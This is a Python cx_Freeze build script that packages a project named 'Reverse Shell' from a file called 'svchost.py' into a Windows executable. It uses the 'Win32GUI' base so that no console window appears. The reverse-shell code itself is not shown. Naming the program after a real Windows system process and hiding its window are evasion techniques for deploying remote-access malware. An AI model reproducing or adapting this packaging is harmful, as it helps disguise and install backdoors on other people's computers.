#!/usr/bin/python
#coding:utf-8
import sys
from cx_Freeze import setup, Executable

path = sys.path
includes = []
excludes = []
packages = []

options = {"path": path,
           "includes": includes,
           "excludes": excludes,
           "packages": packages
           }

base = None
if (sys.platform == "win32"):
    base = "Win32GUI"
setup(
	name = "Reverse Shell",
	version = "1.0",
	description = "Powershell",
    options = {"build_exe": options},
	executables = [Executable("svchost.py", base=base)]
)
